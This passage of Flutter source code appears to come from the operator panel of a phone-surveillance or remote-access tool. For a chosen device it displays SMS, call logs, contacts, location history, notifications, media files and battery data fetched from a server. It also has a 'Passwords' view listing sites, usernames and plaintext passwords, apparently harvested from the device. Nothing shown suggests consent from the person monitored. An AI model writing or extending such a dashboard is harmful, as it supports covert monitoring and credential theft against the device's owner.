          ],
        ),
      );
    }

    return GridView.builder(
      padding: EdgeInsets.all(12),
      gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2,
        crossAxisSpacing: 10,
        mainAxisSpacing: 10,
        childAspectRatio: 0.8,
      ),
      itemCount: _mediaFiles.length,
      itemBuilder: (context, index) {
        final file = _mediaFiles[index];
        final isVideo = file['type'] == 'video';
        
        return GestureDetector(
          onTap: () {
            _showMediaDetail(file, deviceId);
          },
          child: Container(
            decoration: BoxDecoration(
              color: cardBg,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: cardBorder, width: 1),
            ),
            child: Stack(
              fit: StackFit.expand,
              children: [
                // Thumbnail
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(16),
                    image: DecorationImage(
                      image: NetworkImage('$baseUrl/media/file?device=$deviceId&username=${widget.username}&file=${file['name']}'),
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
                // Gradient Overlay
                Container(
                  decoration: BoxDecoration(
                    borderRadius: BorderRadius.circular(16),
                    gradient: LinearGradient(
                      begin: Alignment.topCenter,
                      end: Alignment.bottomCenter,
                      colors: [
                        Colors.transparent,
                        bgDark.withOpacity(0.7),
                      ],
                    ),
                  ),
                ),
                // Video Icon
                if (isVideo)
                  Positioned(
                    top: 8,
                    right: 8,
                    child: Container(
                      padding: EdgeInsets.all(6),
                      decoration: BoxDecoration(
                        color: Colors.black.withOpacity(0.6),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Icon(Icons.play_arrow, color: Colors.white, size: 20),
                    ),
                  ),
                // File Info
                Positioned(
                  bottom: 0,
                  left: 0,
                  right: 0,
                  child: Padding(
                    padding: EdgeInsets.all(8),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          file['name'] ?? 'Unknown',
                          style: TextStyle(
                            color: textWhite,
                            fontFamily: 'ShareTechMono',
                            fontSize: 10,
                            fontWeight: FontWeight.bold,
                          ),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                        Text(
                          isVideo ? '🎬 Video' : '🖼️ Image',
                          style: TextStyle(
                            color: textDim,
                            fontFamily: 'ShareTechMono',
                            fontSize: 8,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  void _showMediaDetail(Map<String, dynamic> file, String deviceId) {
    final isVideo = file['type'] == 'video';
    final mediaUrl = '$baseUrl/media/file?device=$deviceId&username=${widget.username}&file=${file['name']}';

    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.9),
      builder: (context) => Dialog(
        backgroundColor: bgDeep,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: neonMagenta.withOpacity(0.3), width: 1),
        ),
        child: Container(
          width: double.infinity,
          height: MediaQuery.of(context).size.height * 0.6,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              // Header
              Container(
                padding: EdgeInsets.all(12),
                decoration: BoxDecoration(
                  border: Border(
                    bottom: BorderSide(color: cardBorder, width: 1),
                  ),
                ),
                child: Row(
                  children: [
                    Expanded(
                      child: Text(
                        file['name'] ?? 'Media',
                        style: TextStyle(
                          color: textWhite,
                          fontFamily: 'Orbitron',
                          fontSize: 12,
                          fontWeight: FontWeight.bold,
                        ),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                    IconButton(
                      icon: Icon(Icons.close, color: textDim),
                      onPressed: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),
              // Media Content
              Expanded(
                child: Center(
                  child: isVideo
                      ? Icon(Icons.play_circle_filled, color: neonMagenta, size: 80)
                      : Image.network(
                          mediaUrl,
                          fit: BoxFit.contain,
                          loadingBuilder: (context, child, loadingProgress) {
                            if (loadingProgress == null) return child;
                            return Center(
                              child: CircularProgressIndicator(
                                valueColor: AlwaysStoppedAnimation<Color>(neonMagenta),
                                strokeWidth: 2,
                              ),
                            );
                          },
                          errorBuilder: (context, error, stackTrace) {
                            return Column(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.broken_image, color: textDim, size: 48),
                                SizedBox(height: 8),
                                Text(
                                  'Failed to load media',
                                  style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 11),
                                ),
                              ],
                            );
                          },
                        ),
                ),
              ),
              // Actions
              Container(
                padding: EdgeInsets.all(12),
                decoration: BoxDecoration(
                  border: Border(
                    top: BorderSide(color: cardBorder, width: 1),
                  ),
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    if (!isVideo)
                      _mediaActionBtn(
                        icon: Icons.download,
                        label: 'Save',
                        color: neonMagenta,
                        onTap: () {
                          _showSuccessSnackbar('Downloading...');
                        },
                      ),
                    SizedBox(width: 12),
                    _mediaActionBtn(
                      icon: Icons.share,
                      label: 'Share',
                      color: neonPurple,
                      onTap: () {
                        _showSuccessSnackbar('Share feature coming soon');
                      },
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _mediaActionBtn({
    required IconData icon,
    required String label,
    required Color color,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        decoration: BoxDecoration(
          color: color.withOpacity(0.2),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: color.withOpacity(0.3), width: 1),
        ),
        child: Row(
          children: [
            Icon(icon, color: color, size: 16),
            SizedBox(width: 6),
            Text(
              label,
              style: TextStyle(
                color: color,
                fontFamily: 'Orbitron',
                fontSize: 10,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ==================== DATA VIEW (Legacy) ====================

  Widget _buildDataView() {
    if (_selectedDataType == null) return SizedBox();

    final String deviceId = _selectedDevice?['device_id'] ?? '';
  
    return Column(
      children: [
        Container(
          width: double.infinity,
          padding: EdgeInsets.all(16),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [neonMagenta.withOpacity(0.15), Colors.transparent],
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
            ),
          ),
          child: Row(
            children: [
              Container(
                padding: EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: neonMagenta.withOpacity(0.2),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Icon(
                  _selectedDataType == 'locations' ? Icons.location_on : 
                  _selectedDataType == 'media' ? Icons.image :
                  _selectedDataType == 'sms' ? Icons.sms :
                  _selectedDataType == 'calls' ? Icons.phone :
                  _selectedDataType == 'contacts' ? Icons.contacts :
                  _selectedDataType == 'passwords' ? Icons.lock :
                  _selectedDataType == 'notifications' ? Icons.notifications :
                  Icons.battery_charging_full,
                  color: neonMagenta,
                  size: 18,
                ),
              ),
              SizedBox(width: 10),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      _selectedDataType == 'locations' ? 'Location History' :
                      _selectedDataType == 'media' ? 'Media Files' :
                      _selectedDataType == 'sms' ? 'SMS Messages' :
                      _selectedDataType == 'calls' ? 'Call Logs' :
                      _selectedDataType == 'contacts' ? 'Contacts' :
                      _selectedDataType == 'passwords' ? 'Passwords' :
                      _selectedDataType == 'notifications' ? 'Notifications' :
                      'Battery',
                      style: TextStyle(
                        color: textWhite,
                        fontFamily: 'Orbitron',
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    Text(
                      _selectedDevice!['model'] ?? 'Unknown',
                      style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: _isLoadingData
              ? Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      CircularProgressIndicator(
                        valueColor: AlwaysStoppedAnimation<Color>(neonMagenta),
                        strokeWidth: 2,
                      ),
                      SizedBox(height: 12),
                      Text(
                        'FETCHING...',
                        style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                      ),
                    ],
                  ),
                )
              : _selectedDataType == 'locations'
                  ? _buildLocationsList()
                  : _selectedDataType == 'media'
                      ? _buildMediaGridView(deviceId)
                      : _selectedDataType == 'sms'
                          ? _buildSmsList()
                          : _selectedDataType == 'calls'
                              ? _buildCallsList()
                              : _selectedDataType == 'contacts'
                                  ? _buildContactsList()
                                  : _selectedDataType == 'passwords'
                                      ? _buildPasswordsList()
                                      : _selectedDataType == 'notifications'
                                          ? _buildNotificationsList()
                                          : _buildBatteryDetailView(),
        ),
      ],
    );
  }

  Widget _buildSmsList() {
    if (_smsList.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.sms, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No SMS', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return ListView.builder(
      padding: EdgeInsets.all(12),
      itemCount: _smsList.length,
      itemBuilder: (context, index) {
        final sms = _smsList[index];
        return Container(
          margin: EdgeInsets.only(bottom: 8),
          padding: EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: cardBorder, width: 1),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Icon(Icons.person, color: Colors.blue, size: 14),
                  SizedBox(width: 6),
                  Expanded(
                    child: Text(
                      sms['address'] ?? 'Unknown',
                      style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11, fontWeight: FontWeight.bold),
                    ),
                  ),
                  Text(
                    _formatEpochTime(sms['timestamp'] ?? sms['date']),
                    style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
                  ),
                ],
              ),
              SizedBox(height: 4),
              Text(
                sms['body'] ?? '',
                style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildCallsList() {
    if (_callsList.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.phone, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No Calls', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return ListView.builder(
      padding: EdgeInsets.all(12),
      itemCount: _callsList.length,
      itemBuilder: (context, index) {
        final call = _callsList[index];
        return Container(
          margin: EdgeInsets.only(bottom: 8),
          padding: EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: cardBorder, width: 1),
          ),
          child: Row(
            children: [
              Icon(
                call['type'] == 'incoming' ? Icons.call_received : 
                call['type'] == 'outgoing' ? Icons.call_made : Icons.call_missed,
                color: call['type'] == 'incoming' ? Colors.green : 
                       call['type'] == 'outgoing' ? Colors.orange : Colors.red,
                size: 20,
              ),
              SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      call['number'] ?? 'Unknown',
                      style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11, fontWeight: FontWeight.bold),
                    ),
                    Text(
                      '${call['duration'] ?? '0s'} • ${_formatEpochTime(call['timestamp'] ?? call['date'])}',
                      style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
                    ),
                  ],
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildContactsList() {
    if (_contactsList.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.contacts, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No Contacts', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return ListView.builder(
      padding: EdgeInsets.all(12),
      itemCount: _contactsList.length,
      itemBuilder: (context, index) {
        final contact = _contactsList[index];
        return Container(
          margin: EdgeInsets.only(bottom: 8),
          padding: EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: cardBorder, width: 1),
          ),
          child: Row(
            children: [
              CircleAvatar(
                backgroundColor: neonMagenta.withOpacity(0.2),
                radius: 20,
                child: Text(
                  (contact['name'] ?? '?')[0].toUpperCase(),
                  style: TextStyle(color: neonMagenta, fontSize: 16, fontWeight: FontWeight.bold),
                ),
              ),
              SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      contact['name'] ?? 'Unknown',
                      style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11, fontWeight: FontWeight.bold),
                    ),
                    Text(
                      contact['number'] ?? '',
                      style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                    ),
                  ],
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildPasswordsList() {
    if (_passwordsList.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.lock, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No Passwords', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return ListView.builder(
      padding: EdgeInsets.all(12),
      itemCount: _passwordsList.length,
      itemBuilder: (context, index) {
        final pwd = _passwordsList[index];
        return Container(
          margin: EdgeInsets.only(bottom: 8),
          padding: EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.red.withOpacity(0.3), width: 1),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                pwd['website'] ?? pwd['app'] ?? 'Unknown',
                style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11, fontWeight: FontWeight.bold),
              ),
              SizedBox(height: 4),
              Row(
                children: [
                  Icon(Icons.person, color: Colors.blue, size: 12),
                  SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      pwd['username'] ?? '',
                      style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                    ),
                  ),
                ],
              ),
              Row(
                children: [
                  Icon(Icons.key, color: Colors.yellow, size: 12),
                  SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      pwd['password'] ?? '',
                      style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                    ),
                  ),
                ],
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildNotificationsList() {
    if (_notificationsList.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.notifications_off, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No Notifications', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return ListView.builder(
      padding: EdgeInsets.all(12),
      itemCount: _notificationsList.length,
      itemBuilder: (context, index) {
        final notif = _notificationsList[index];
        return Container(
          margin: EdgeInsets.only(bottom: 8),
          padding: EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: Colors.orange.withOpacity(0.3), width: 1),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Icon(Icons.notifications, color: Colors.orange, size: 14),
                  SizedBox(width: 6),
                  Expanded(
                    child: Text(
                      notif['title'] ?? 'No Title',
                      style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11, fontWeight: FontWeight.bold),
                    ),
                  ),
                  Text(
                    _formatEpochTime(notif['timestamp']),
                    style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
                  ),
                ],
              ),
              SizedBox(height: 4),
              Text(
                notif['body'] ?? '',
                style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 10),
                maxLines: 3,
                overflow: TextOverflow.ellipsis,
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildMediaGridView(String deviceId) {
    if (_mediaFiles.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.image_not_supported, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No media', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return GridView.builder(
      padding: EdgeInsets.all(12),
      gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 2,
        crossAxisSpacing: 8,
        mainAxisSpacing: 8,
        childAspectRatio: 0.9,
      ),
      itemCount: _mediaFiles.length,
      itemBuilder: (context, index) {
        final file = _mediaFiles[index];
        return Container(
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: cardBorder, width: 1),
          ),
          child: Stack(
            fit: StackFit.expand,
            children: [
              ClipRRect(
                borderRadius: BorderRadius.circular(12),
                child: Image.network(
                  '$baseUrl/media/file?device=$deviceId&username=${widget.username}&file=${file['name']}',
                  fit: BoxFit.cover,
                  loadingBuilder: (context, child, loadingProgress) {
                    if (loadingProgress == null) return child;
                    return Center(
                      child: CircularProgressIndicator(
                        valueColor: AlwaysStoppedAnimation<Color>(neonMagenta),
                        strokeWidth: 2,
                      ),
                    );
                  },
                  errorBuilder: (context, error, stackTrace) {
                    return Center(
                      child: Icon(Icons.broken_image, color: textDim, size: 32),
                    );
                  },
                ),
              ),
              if (file['type'] == 'video')
                Positioned(
                  top: 4,
                  right: 4,
                  child: Container(
                    padding: EdgeInsets.all(4),
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.6),
                      borderRadius: BorderRadius.circular(6),
                    ),
                    child: Icon(Icons.play_arrow, color: Colors.white, size: 16),
                  ),
                ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildLocationsList() {
    if (_locations.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.location_off, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No data', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return ListView.builder(
      padding: EdgeInsets.all(12),
      itemCount: _locations.length,
      itemBuilder: (context, index) {
        final loc = _locations[index];
        return Container(
          margin: EdgeInsets.only(bottom: 8),
          padding: EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: cardBorder, width: 1),
          ),
          child: Column(
            children: [
              Row(
                children: [
                  Icon(Icons.location_on, color: Colors.red, size: 14),
                  SizedBox(width: 4),
                  Text(
                    '${loc['lat'].toStringAsFixed(5)}, ${loc['lng'].toStringAsFixed(5)}',
                    style: TextStyle(color: textWhite, fontFamily: 'ShareTechMono', fontSize: 11),
                  ),
                ],
              ),
              SizedBox(height: 6),
              Row(
                children: [
                  _chip(Icons.satellite, '${loc['accuracy']}m', Colors.blue),
                  SizedBox(width: 6),
                  _chip(Icons.speed, '${loc['speed']} m/s', Colors.orange),
                  SizedBox(width: 6),
                  _chip(Icons.device_hub, loc['provider'] ?? 'gps', neonPurple),
                ],
              ),
              SizedBox(height: 4),
              Text(
                _formatEpochTime(loc['time']),
                style: TextStyle(color: textDim, fontFamily: 'ShareTechMono', fontSize: 9),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _chip(IconData icon, String label, Color color) {
    return Container(
      padding: EdgeInsets.symmetric(horizontal: 6, vertical: 2),
      decoration: BoxDecoration(
        color: color.withOpacity(0.15),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: color.withOpacity(0.3), width: 0.5),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, color: color, size: 10),
          SizedBox(width: 2),
          Text(label, style: TextStyle(color: color, fontFamily: 'ShareTechMono', fontSize: 8)),
        ],
      ),
    );
  }

  Widget _buildBatteryDetailView() {
    if (_batteryInfo.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.battery_unknown, size: 40, color: textDim),
            SizedBox(height: 8),
            Text('No data', style: TextStyle(color: textDim, fontFamily: 'ShareTechMono')),
          ],
        ),
      );
    }
    return Container(
      margin: EdgeInsets.all(16),
      padding: EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: cardBorder, width: 1),
      ),
      child: Column(
        children: [
          Stack(
            alignment: Alignment.center,
            children: [
              SizedBox(
                width: 100,
                height: 100,
                child: CircularProgressIndicator(
                  value: (_batteryInfo['battery'] ?? 0) / 100,
                  strokeWidth: 6,
                  backgroundColor: bgDark,
                  valueColor: AlwaysStoppedAnimation<Color>(
                    (_batteryInfo['battery'] ?? 0) > 20 ? Colors.green : Colors.red,
                  ),
                ),
              ),
              Column(
                children: [
                  Text(
                    '${_batteryInfo['battery'] ?? 0}%',
                    style: TextStyle(
                      color: textWhite,
                      fontFamily: 'Orbitron',
                      fontSize: 20,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  Text(
                    _batteryInfo['charging'] == true ? 'CHARGING' : 'NOT CHARGING',
                    style: TextStyle(
                      color: _batteryInfo['charging'] == true ? Colors.green : textDim,
                      fontFamily: 'ShareTechMono',
                      fontSize: 9,
                    ),
                  ),
                ],
              ),
            ],
          ),
          SizedBox(height: 16),
          _infoRow('Temperature', '${_batteryInfo['temperature'] ?? 0}°C'),
          _infoRow('Health', _batteryInfo['health'] ?? 'Unknown'),
          _infoRow('Voltage', '${_batteryInfo['voltage'] ?? 0} mV'),
          _infoRow('Last Updated', _formatDateTime(_batteryInfo['last_seen'])),
        ],
      ),
    );
  }
}